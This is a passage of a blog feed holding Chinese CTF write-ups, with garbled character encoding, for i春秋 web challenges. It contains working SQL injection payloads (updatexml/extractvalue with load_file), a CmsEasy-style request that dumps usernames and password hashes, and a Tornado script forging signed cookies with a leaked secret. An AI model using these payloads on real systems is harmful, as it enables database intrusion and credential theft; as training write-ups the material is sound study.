href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=</a>(select * from information_schema.tables where 1=2 or (updatexml(1,concat(0x7e,(select version()),0x7e),1)))a%23)</p><p>èŽ·å–æ•°æ®åº“åç§°</p><p>[<a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(select%20database()),0x7e),1)))a%23%5D">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(select%20database()),0x7e),1)))a%23]</a>(<a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=</a>(select * from information_schema.tables where 1=2 or (updatexml(1,concat(0x7e,(select database()),0x7e),1)))a%23)</p><p>ç„¶åŽèŽ·å–è¡¨ï¼Œåˆ—ï¼Œæ•°æ®ä¿¡æ¯ï¼Œå‘çŽ°å¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„flagï¼Œæ‰€ä»¥è¯´flagä¸åœ¨è¿™é‡Œ</p><p>æ ¹æ®æ ‡é¢˜æç¤º<img src="https://img2018.cnblogs.com/blog/1712230/201907/1712230-20190724213647420-1130270981.png" alt="img"></p><p>flagå¯èƒ½è·Ÿä¹‹å‰ä¸€æ ·åœ¨/var/www/html/flag.phpä¸­</p><p>ç„¶åŽä½¿ç”¨select load_fileå‡½æ•°è¯•äº†è¯•select load_file(â€œ/var/www/html/flag.phpâ€)å’Œselect load_file(â€˜/var/www/html/flag.phpâ€™)ï¼Œå‘çŽ° â€™ åœ¨è¢«æäº¤æ—¶ä¼šè½¬å˜æˆ \â€™</p><p><img src="https://img2018.cnblogs.com/blog/1712230/201907/1712230-20190724213700756-1210776533.png" alt="img"></p><p>â€œ åŒæ ·</p><p>æ‰€ä»¥è¿™é‡Œä¸èƒ½ä½¿ç”¨ â€™ ä¸Ž â€ äº†ï¼Œæ”¹ä¸º16è¿›åˆ¶</p><p>0x2F7661722F7777772F68746D6C2F666C61672E706870</p><p>æž„é€ payload</p><p><a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(%20select%20mid((select%20load_file(0x2F7661722F7777772F68746D6C2F666C61672E706870)),1,32)%20),0x7e),1)))a%23">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(%20select%20mid((select%20load_file(0x2F7661722F7777772F68746D6C2F666C61672E706870)),1,32)%20),0x7e),1)))a%23</a></p><p>é€šè¿‡ä¸æ–­ä¸æ–­æ›´æ”¹1çš„å€¼å¾—åˆ°flag</p><p><img src="https://img2018.cnblogs.com/blog/1712230/201907/1712230-20190724213716846-1712917864.png" alt="img"></p><pre><code>flag{9b0025d8-a22f-495c-b837-ed94a127415d}</code></pre><p><img src="/2021/04/29/i-chun-qiu-web-zai-jian-cms/be29f7fb70b0a46eabb8947279d4e37.png" alt="be29f7fb70b0a46eabb8947279d4e37"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-YeserCMS</title>
      <link href="2021/04/28/i-chun-qiu-web-yesercms/"/>
      <url>2021/04/28/i-chun-qiu-web-yesercms/</url>
      
        <content type="html"><![CDATA[<h2 id="åˆ¤æ–­CMSç±»åž‹"><a href="#åˆ¤æ–­CMSç±»åž‹" class="headerlink" title="åˆ¤æ–­CMSç±»åž‹"></a>åˆ¤æ–­CMSç±»åž‹</h2><h3 id="ä»€ä¹ˆæ˜¯CMS"><a href="#ä»€ä¹ˆæ˜¯CMS" class="headerlink" title="ä»€ä¹ˆæ˜¯CMS"></a>ä»€ä¹ˆæ˜¯CMS</h3><p>æˆ‘ä»¬è¦çŸ¥é“ï¼ŒCMSä»£è¡¨â€œå†…å®¹ç®¡ç†ç³»ç»Ÿâ€ï¼Œæ˜¯ä¸€ç§è½¯ä»¶å·¥å…·ï¼Œå…è®¸æˆ‘ä»¬åˆ›å»ºï¼Œç¼–è¾‘å’Œå‘å¸ƒå†…å®¹ã€‚è™½ç„¶æ—©æœŸçš„CMSè½¯ä»¶ç”¨äºŽç®¡ç†æ–‡æ¡£å’Œæœ¬åœ°è®¡ç®—æœºæ–‡ä»¶ï¼Œä½†å¤§å¤šæ•°CMSç³»ç»ŸçŽ°åœ¨ä¸“é—¨ç”¨äºŽç®¡ç†Webä¸Šçš„å†…å®¹ã€‚</p><p>å†…å®¹ç®¡ç†ç³»ç»Ÿåˆ†ä¸ºå››ç§ä¸åŒç±»åž‹ï¼šä¼ä¸šå†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆECM / ECMSï¼‰ï¼ŒWebå†…å®¹ç®¡ç†ç³»ç»Ÿï¼ŒWebç»„å†…å®¹ç®¡ç†ç³»ç»Ÿå’Œç»„ä»¶å†…å®¹ç®¡ç†ç³»ç»Ÿã€‚</p><h3 id="åˆ¤æ–­ç›®æ ‡"><a href="#åˆ¤æ–­ç›®æ ‡" class="headerlink" title="åˆ¤æ–­ç›®æ ‡"></a>åˆ¤æ–­ç›®æ ‡</h3><p>è„šæœ¬è¯­è¨€<br>æ“ä½œç³»ç»Ÿ<br>æ­å»ºå¹³å°<br>CMSåŽ‚å•†</p><h3 id="ä½¿ç”¨å·¥å…·"><a href="#ä½¿ç”¨å·¥å…·" class="headerlink" title="ä½¿ç”¨å·¥å…·"></a>ä½¿ç”¨å·¥å…·</h3><p>AWVS<br>WWWSCAN<br>whatweb<br>googlehack</p><h2 id="YeserCMS"><a href="#YeserCMS" class="headerlink" title="YeserCMS"></a>YeserCMS</h2><ul><li><p>ç¬¬ä¸€æ­¥,è‚¯å®šæ˜¯è¦åˆ¤æ–­å‡ºcmsç±»åž‹ </p></li><li><p>ç¬¬äºŒæ­¥,æŸ¥è¯¢è¯¥cmsæ›¾ç»å‡ºçŽ°çš„æ¼æ´ž </p></li><li><p>ç¬¬ä¸‰æ­¥,ç„¶åŽåˆ©ç”¨è¿™äº›æ¼æ´žæ‹¿åˆ°flag</p><p>![7cd2bb9a01f5505ad376cea92ddb627](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/7cd2bb9a01f5505ad376cea92ddb627.png)</p></li></ul><p>easycmså»ºé€ çš„ç½‘ç«™éƒ½ä¼šä¿ç•™è¿™ä¸ªè¥é”€ç½‘ç»œçš„ç•Œé¢</p><p>æ¼æ´žæäº¤æ–‡æ¡£é‡Œæœ‰è¿™æ ·çš„æ³¨å…¥æ–¹å¼ï¼š</p><pre><code>å‘é€url:http://localhost/Cmseasy/celive/live/header.phppostdata:xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat%2528username%252C%2527%257C%2527%252Cpassword%2529%2529%2520from%2520cmseasy_user%2529%252C1%252C32%2529%252C0x5d%2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520&lt;/q&gt;&lt;/xjxquery&gt;</code></pre><p>posté‡Œçš„æ•°æ®æœ‰äº›éƒ¨åˆ†è¿›è¡ŒäºŒæ¬¡urlç¼–ç ï¼šè§£ç åŽå¦‚ä¸‹ï¼š</p><pre><code>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from cmseasy_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;</code></pre><p>å°†cmseasyæ”¹ä¸ºyesercmsï¼Œ ç„¶åŽæ³¨å…¥</p><p><q>detail=xxxxxxâ€™%2c%20(updatexml(1%2cconcat(0x5b%2cmid((select%2f**%2fgroup_concat(concat(username%2câ€™%7câ€™%2cpassword))%20%20from%20yesercms_user)%2c1%2c32)%2c0x5d)%2c1))%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull)â€“%20%3c%2fq%3e</q></p><p>![7870a0d75efdcc15f14357962f907bb](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/7870a0d75efdcc15f14357962f907bb.png)</p><p>![2a554f590ddf4312f5eaa8599b8856b](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/2a554f590ddf4312f5eaa8599b8856b.png)</p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-GetFlag</title>
      <link href="2021/04/26/i-chun-qiu-web-getflag/"/>
      <url>2021/04/26/i-chun-qiu-web-getflag/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/26/i-chun-qiu-web-getflag/28b861406b7c468016908395617f090.png" alt="28b861406b7c468016908395617f090">åˆ«äººå†™çš„è„šæœ¬ï¼š</p><pre><code>import requestsimport base64import sysimport hashlibdef getMd5(index):    for i in range(100000,100000000):        x = i        md5 = hashlib.md5(str(x).encode("utf8")).hexdigest()        if md5[0:6] == index:            return x;print(getMd5("3aab4a"))</code></pre><p>6516624</p><p><img src="/2021/04/26/i-chun-qiu-web-getflag/18165af35577bc59c5fd95424960aff.png" alt="18165af35577bc59c5fd95424960aff"></p><p>a.php</p><pre><code>&lt;?php    echo "Do what you want to do, web dog, flag is in the web root dir";?&gt;</code></pre><pre><code>?php$f = $_POST['flag'];$f = str_replace(array('`', '$', '*', '#', ':', '\\', '"', "'", '(', ')', '.', '&gt;'), '', $f);if((strlen($f) &gt; 13) || (false !== stripos($f, 'return'))){        die('wowwwwwwwwwwwwwwwwwwwwwwwww');}try{         eval("\$spaceone = $f");}catch (Exception $e){        return false;}if ($spaceone === 'flag'){    echo file_get_contents("helloctf.php");}?&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20190615180605135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTY3Mzk4,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20190615181130692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTY3Mzk4,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-NotFound</title>
      <link href="2021/04/25/i-chun-qiu-web-notfound/"/>
      <url>2021/04/25/i-chun-qiu-web-notfound/</url>
      
        <content type="html"><![CDATA[<h3 id="HTTPè¯·æ±‚æ–¹æ³•ï¼š"><a href="#HTTPè¯·æ±‚æ–¹æ³•ï¼š" class="headerlink" title="HTTPè¯·æ±‚æ–¹æ³•ï¼š"></a>HTTPè¯·æ±‚æ–¹æ³•ï¼š</h3><p>HTTP å®šä¹‰äº†ä¸€ç»„<strong>è¯·æ±‚æ–¹æ³•</strong>, ä»¥è¡¨æ˜Žè¦å¯¹ç»™å®šèµ„æºæ‰§è¡Œçš„æ“ä½œã€‚æŒ‡ç¤ºé’ˆå¯¹ç»™å®šèµ„æºè¦æ‰§è¡Œçš„æœŸæœ›åŠ¨ä½œ. è™½ç„¶ä»–ä»¬ä¹Ÿå¯ä»¥æ˜¯åè¯, ä½†è¿™äº›è¯·æ±‚æ–¹æ³•æœ‰æ—¶è¢«ç§°ä¸ºHTTPåŠ¨è¯. æ¯ä¸€ä¸ªè¯·æ±‚æ–¹æ³•éƒ½å®žçŽ°äº†ä¸åŒçš„è¯­ä¹‰, ä½†ä¸€äº›å…±åŒçš„ç‰¹å¾ç”±ä¸€ç»„å…±äº«ï¼š: ä¾‹å¦‚ä¸€ä¸ªè¯·æ±‚æ–¹æ³•å¯ä»¥æ˜¯ <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/safe">safe</a>, <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Idempotent">idempotent</a>, æˆ– <a href="https://developer.mozilla.org/en-US/docs/Glossary/cacheable">cacheable (en-US)</a>.</p><ul><li><p><code>GET</code></p><p>GETæ–¹æ³•è¯·æ±‚ä¸€ä¸ªæŒ‡å®šèµ„æºçš„è¡¨ç¤ºå½¢å¼. ä½¿ç”¨GETçš„è¯·æ±‚åº”è¯¥åªè¢«ç”¨äºŽèŽ·å–æ•°æ®.</p></li><li><p><code>HEAD</code></p><p>HEADæ–¹æ³•è¯·æ±‚ä¸€ä¸ªä¸ŽGETè¯·æ±‚çš„å“åº”ç›¸åŒçš„å“åº”ï¼Œä½†æ²¡æœ‰å“åº”ä½“.</p></li><li><p><code>POST</code></p><p>POSTæ–¹æ³•ç”¨äºŽå°†å®žä½“æäº¤åˆ°æŒ‡å®šçš„èµ„æºï¼Œé€šå¸¸å¯¼è‡´åœ¨æœåŠ¡å™¨ä¸Šçš„çŠ¶æ€å˜åŒ–æˆ–å‰¯ä½œç”¨. </p></li><li><p><code>PUT</code></p><p>PUTæ–¹æ³•ç”¨è¯·æ±‚æœ‰æ•ˆè½½è·æ›¿æ¢ç›®æ ‡èµ„æºçš„æ‰€æœ‰å½“å‰è¡¨ç¤ºã€‚</p></li><li><p><code>DELETE</code></p><p>DELETEæ–¹æ³•åˆ é™¤æŒ‡å®šçš„èµ„æºã€‚</p></li><li><p><code>CONNECT</code></p><p>CONNECTæ–¹æ³•å»ºç«‹ä¸€ä¸ªåˆ°ç”±ç›®æ ‡èµ„æºæ ‡è¯†çš„æœåŠ¡å™¨çš„éš§é“ã€‚</p></li><li><p><code>OPTIONS</code></p><p>OPTIONSæ–¹æ³•ç”¨äºŽæè¿°ç›®æ ‡èµ„æºçš„é€šä¿¡é€‰é¡¹ã€‚</p></li><li><p><code>TRACE</code></p><p>TRACEæ–¹æ³•æ²¿ç€åˆ°ç›®æ ‡èµ„æºçš„è·¯å¾„æ‰§è¡Œä¸€ä¸ªæ¶ˆæ¯çŽ¯å›žæµ‹è¯•ã€‚</p></li><li><p><code>PATCH</code></p><p>PATCHæ–¹æ³•ç”¨äºŽå¯¹èµ„æºåº”ç”¨éƒ¨åˆ†ä¿®æ”¹ã€‚</p></li></ul><h3 id="Web-NotFound"><a href="#Web-NotFound" class="headerlink" title="Web-NotFound"></a>Web-NotFound</h3><p>è¿™é‡Œä¿®æ”¹ä¸ºOPTIONS</p><p><img src="/2021/04/25/i-chun-qiu-web-notfound/%7BN4UJOM4%25A%5BAA7AMQB8I0PF.png" alt="img"></p><p>å‘çŽ°å½“httpä»¥optionsçš„å½¢å¼è¿›è¡Œè¯·æ±‚æ—¶å‡ºçŽ°äº†æ–‡ä»¶æŸ¥è¯¢çš„æ“ä½œ</p><p>åŽ»urlä¸­è¯•è¯•è®¿é—®/1.phpï¼Œç»“æžœnot here plz tryingï¼Œæ„æ€æ˜¯ä¸åœ¨è¿™é‡Œï¼Œè¯·å°è¯•å…¶ä»–æ–¹æ³•ã€‚</p><p>ã€‚ã€‚ã€‚ã€‚æ— æžœï¼Œåœ¨urlä¸­åŠ å…¥/?f=1.phpè¯•è¯•ï¼Œæ²¡ä»€ä¹ˆæ˜¾ç¤ºï¼ŒæŸ¥æºç ï¼Œæ²¡ä¸œè¥¿ï¼ŒæŠ“åŒ…</p><p><img src="/2021/04/25/i-chun-qiu-web-notfound/2.png" alt="2"></p><pre><code>?f=.htaccess</code></pre><p><img src="/2021/04/25/i-chun-qiu-web-notfound/3.png" alt="3"></p><p>è®¿é—®ç½‘ç«™ï¼š</p><p><img src="/2021/04/25/i-chun-qiu-web-notfound/4.png" alt="4"></p><p>æ‰€ä»¥è¿™é‡ŒæŠ“åŒ…è¿›è¡Œä¿®æ”¹</p><p>å…ˆå°è¯•ä¼ å…¥æœ¬åœ°ipï¼šX-Forwarded-For:127.0.0.1ï¼ˆä¸è¡Œï¼‰ï¼Œä»–æç¤ºäº†æˆ‘ä»¬XFFçš„ã€‚ã€‚ã€‚</p><p>æ‰€ä»¥è¿™é‡Œè¿˜æœ‰ä¸€ç§æ–¹æ³•client-ip:127.0.0.1</p><p><img src="/2021/04/25/i-chun-qiu-web-notfound/5.png" alt="5"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-backdoor</title>
      <link href="2021/04/24/i-chun-qiu-web-backdoor/"/>
      <url>2021/04/24/i-chun-qiu-web-backdoor/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-XSSå¹³å°</title>
      <link href="2021/04/23/i-chun-qiu-web-xss-ping-tai/"/>
      <url>2021/04/23/i-chun-qiu-web-xss-ping-tai/</url>
      
        <content type="html"><![CDATA[<p>æž„é€ éžæ³•å‚æ•°æ¥è®©ç½‘é¡µè¿”å›žé”™è¯¯ä¿¡æ¯</p><p><img src="/2021/04/23/i-chun-qiu-web-xss-ping-tai/%E9%9D%9E%E6%B3%95%E5%8F%82%E6%95%B0.png" alt="éžæ³•å‚æ•°"></p><p>åŽ»GitHubæœç´¢Rtinyï¼Œ<a href="https://github.com/r0ker/Rtiny-xss%EF%BC%8C%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%E4%B8%8Brtiny/lock.py%E6%96%87%E4%BB%B6">https://github.com/r0ker/Rtiny-xssï¼ŒæŸ¥çœ‹ç›®å½•ä¸‹rtiny/lock.pyæ–‡ä»¶</a></p><p><img src="/2021/04/23/i-chun-qiu-web-xss-ping-tai/lockpy.png" alt="lockpy"></p><p>set_secure_cookie:</p><p><img src="/2021/04/23/i-chun-qiu-web-xss-ping-tai/setsecurecookie.jpg" alt="setsecurecookie"></p><p>cookieæ˜¯è¢«åŠ å¯†è¿‡çš„ï¼ŒåŠ å¯†ä½¿ç”¨çš„keyåœ¨index.phpæ–‡ä»¶ä¸­</p><p><img src="/2021/04/23/i-chun-qiu-web-xss-ping-tai/cookie.jpg" alt="cookie"></p><p>åˆ«äººå†™çš„è„šæœ¬ï¼š</p><pre><code>import tornado.ioloopimport tornado.web settings = {    "cookie_secret" : "M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=",}class MainHandler(tornado.web.RequestHandler):    def get(self):        self.write("Hello")        self.set_secure_cookie("username", "' and 1=2 union select extractvalue(1,concat(0x5c,mid((select load_file('/var/www/html/f13g_ls_here.txt')),1,25)));#")        self.write(self.get_secure_cookie("username"))def make_app():    return tornado.web.Application([        (r"/index", MainHandler),        ], **settings)if __name__ == "__main__":    app = make_app()    app.listen(8082)//é˜²æ­¢å’Œbpç«¯å£å†²çªtornado.ioloop.IOLoop.instance().start()</code></pre><p>è¿è¡Œè„šæœ¬ï¼Œè®¿é—®127.0.0.1:8082/indexï¼Œä»Žcookieä¸­å¾—åˆ°usernameçš„å€¼ï¼Œä¸€æ­¥æ­¥æ³¨å…¥å¾—åˆ°ichuqiu|318a61264482e503090facfc4337207f|545 MD5è§£å¯†å¾—å¯†ç Myxss623ï¼Œç™»å½•åŽå°ç‚¹Fileï¼Œå¾—åˆ°æç¤º</p><p>é€šè¿‡MYSQLå‡½æ•° load_fileè¯»å–ï¼Œflagæœ‰ç‚¹é•¿è¦ç”¨mid()æˆ–è€…substr(),æ‹¼èµ·æ¥å°±è¡Œäº†</p><h1 id="â€œç™¾åº¦æ¯â€CTFæ¯”èµ›-ä¹æœˆåœº-XSSå¹³å°"><a href="#â€œç™¾åº¦æ¯â€CTFæ¯”èµ›-ä¹æœˆåœº-XSSå¹³å°" class="headerlink" title="â€œç™¾åº¦æ¯â€CTFæ¯”èµ› ä¹æœˆåœº XSSå¹³å°"></a>â€œç™¾åº¦æ¯â€CTFæ¯”èµ› ä¹æœˆåœº XSSå¹³å°</h1><p>ç™»å½•é¡µé¢ï¼Œå¼€å§‹æ—¶å°è¯•æ³¨å…¥ï¼Œæ²¡æœ‰æ˜Žæ˜¾æ•ˆæžœï¼Œæ— æ³•åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ã€‚</p><p>ä¸€æ—¶æ²¡äº†æ€è·¯ï¼Œçœ‹äº†å¤§ä½¬çš„ WPï¼Œå‘çŽ°å¤§ä½¬ä»¬æ˜¯é€šè¿‡æž„é€ é”™è¯¯å‚æ•°ä½¿å¾—webæŠ¥é”™ï¼Œä»Žè€Œæ”¶é›†ä¿¡æ¯ï¼Œç®—æ˜¯åˆå­¦ä¹ åˆ°äº†ä¸€æ‹›ã€‚</p><p>äºŽæ˜¯ï¼Œåœ¨burpsuiteé‡Œé¢æž„é€ é”™è¯¯å‚æ•°ï¼ŒæŠ¥é”™å¾—åˆ°ä¿¡æ¯</p><p><img src="https://www.pianshen.com/images/701/4671cc330e1e0cf6446dfa638a58222d.png" alt="11129189-2438f0746cee3546.png"></p><p>image</p><p>æŠ¥é”™ä¿¡æ¯ä¸­æœ‰ä¸€ä¸ªrtiny</p><p>åœ¨<a href="https://github.com/r0ker/Rtiny-xss">githubä¸Šæ‰¾åˆ°ç›¸åº” çš„é¡¹ç›®</a></p><p>äºŽæ˜¯ä¸‹è½½æºç ï¼ŒæŽ¥ä¸‹æ¥ï¼Œå®¡è®¡ï¼š</p><p>åœ¨<code>rinty\lock.py</code>ä¸­æœ‰æ˜Žæ˜¾ çš„SQLæ³¨å…¥æ¼æ´žï¼Œè¿™é‡Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ã€‚</p><p><img src="https://www.pianshen.com/images/71/7e462daaefe6432a134846536834bcc7.png" alt="11129189-3966ee6e7920b948.png"></p><p>image</p><p>ä½†æ˜¯ä¸‹é¢ç”¨åˆ°ä¸€ä¸ªæ–¹æ³•ï¼Œ<code>set_secure_cookie</code>ï¼Œåœ¨<code>index.py</code>ä¸­å‘çŽ°ç”¨äºŽåŠ å¯†cookieçš„<code>cookie_secret</code>çš„å€¼ï¼ŒäºŽæ˜¯å¯ä»¥æž„é€ <code>secure_cookie</code></p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†è‡ªå·±çš„æ³¨å…¥è¯­å¥ï¼Œä½¿ç”¨ç›¸åŒçš„<code>cookie_secret</code>åŠ å¯†å³å¯ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><pre><code># coding:utf-8import tornado.ioloopimport tornado.web settings = {    "cookie_secret" : "M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=",}class MainHandler(tornado.web.RequestHandler):    def get(self):        self.write("Hello")        #self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,(select version()))) -- ")        #self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,(select group_concat(distinct table_name) from information_schema.tables where table_schema=database())))-- ")        #self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name='manager')))-- ")        #self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,mid((select group_concat(username,'|',password,'|',email) from manager),30,62))) -- ")       #self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,(select load_file('/var/www/html/f13g_ls_here.txt'))))#")        self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,mid((select load_file('/var/www/html/f13g_ls_here.txt')),28,60)))#")        self.write(self.get_secure_cookie("username"))def make_app():    return tornado.web.Application([        (r"/index", MainHandler),        ], **settings)if __name__ == "__main__":    app = make_app()    app.listen(8089)    tornado.ioloop.IOLoop.instance().start()</code></pre><p>å¸¦ä¸Šcookieï¼ˆusernameï¼‰è®¿é—®lock ï¼ŒæŸ¥ç‰ˆæœ¬æµ‹è¯•ä¸€ä¸‹ï¼š</p><p><img src="https://www.pianshen.com/images/262/47b409e395aaf1167db5a8f3d973023e.png" alt="11129189-718fffb67f014359.png"></p><p>image</p><p>æŸ¥è¡¨å</p><pre><code>' and extractvalue(1,concat(0x5c,(select group_concat(distinct table_name) from information_schema.tables where table_schema=database())))-- </code></pre><p><img src="https://www.pianshen.com/images/218/787ebdfe8192e255861de6abb443d5c2.png" alt="11129189-35c01e3aa6c589c8.png"></p><p>image</p><p>æŸ¥å±žæ€§åˆ—å</p><pre><code>' and extractvalue(1,concat(0x5c,(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name='manager')))-- </code></pre><p><img src="https://www.pianshen.com/images/789/267878078a2f241b36ca425a80d38bb5.png" alt="11129189-fd9af25dae3d0439.png"></p><p>image</p><p><img src="https://www.pianshen.com/images/63/b54bb500d23e6a0cf37bf9bf63b6dae7.png" alt="11129189-92983ee14280cbb0.png"></p><p>image</p><pre><code>ichuqiu|318a61264482e503090facfc4337207f|545md5è§£å¯†å¾—åˆ°è´¦å¯†ï¼šichuqiu|Myxss623</code></pre><p>ç™»é™†åŽå°åœ¨Fileä¸­çœ‹åˆ°æç¤ºï¼š</p><p><img src="https://www.pianshen.com/images/264/2c8aa30ac8f13a68c13c7feff9d8a340.png" alt="11129189-1be8a47d8800123b.png"></p><p>image</p><p>SQLæ³¨å…¥æ¥<code>load_file</code></p><p><img src="https://www.pianshen.com/images/132/0e8c33f3cbb89db93e043655b17052cc.png" alt="11129189-9bd039e82fcc1233.png"></p><p>image</p><p>é€šè¿‡midæˆ–è€…substræ¥è¯»å–å®Œæ•´çš„flagã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-code</title>
      <link href="2021/04/22/i-chun-qiu-web-code/"/>
      <url>2021/04/22/i-chun-qiu-web-code/</url>
      
        <content type="html"><![CDATA[<p>è®¿é—®index.php</p><pre><code>&lt;?php/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */header('content-type:text/html;charset=utf-8');if(! isset($_GET['jpg']))    header('Refresh:0;url=./index.php?jpg=hei.jpg');$file = $_GET['jpg'];echo '&lt;title&gt;file:'.$file.'&lt;/title&gt;';$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);$file = str_replace("config","_", $file);$txt = base64_encode(file_get_contents($file));echo "&lt;img src='data:image/gif;base64,".$txt."'&gt;&lt;/img&gt;";/* * Can you find the flag file? * */?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°æ—¶PHPstormå†™çš„</p><p>è¿™ä¸ªè½¯ä»¶å†™çš„æ—¶å€™ä¼šç”Ÿæˆä¸€ä¸ª.ideaçš„æ–‡ä»¶å¤¹ï¼Œå®ƒå­˜å‚¨äº†é¡¹ç›®çš„é…ç½®æ–‡ä»¶ï¼Œ<br> ä¸€èˆ¬è¿˜å­˜åœ¨workspace.xmlï¼Œæ‰“å¼€.idea/workspace.xml</p><p><img src="/2021/04/22/i-chun-qiu-web-code/idea.png" alt="idea"></p><pre><code>fl3gconfigichuqiu.php</code></pre><pre><code>&lt;?php/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */error_reporting(E_ALL || ~E_NOTICE);include('config.php');function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') {    $hash = '';    $max = strlen($chars) - 1;    for($i = 0; $i &lt; $length; $i++)    {        $hash .= $chars[mt_rand(0, $max)];    }    return $hash;}function encrypt($txt,$key){    for($i=0;$i&lt;strlen($txt);$i++){        $tmp .= chr(ord($txt[$i])+10);    }    $txt = $tmp;    $rnd=random(4);    $key=md5($rnd.$key);    $s=0;    for($i=0;$i&lt;strlen($txt);$i++){        if($s == 32) $s = 0;        $ttmp .= $txt[$i] ^ $key[++$s];    }    return base64_encode($rnd.$ttmp);}function decrypt($txt,$key){    $txt=base64_decode($txt);    $rnd = substr($txt,0,4);    $txt = substr($txt,4);    $key=md5($rnd.$key);    $s=0;    for($i=0;$i&lt;strlen($txt);$i++){        if($s == 32) $s = 0;        $tmp .= $txt[$i]^$key[++$s];    }    for($i=0;$i&lt;strlen($tmp);$i++){        $tmp1 .= chr(ord($tmp[$i])-10);    }    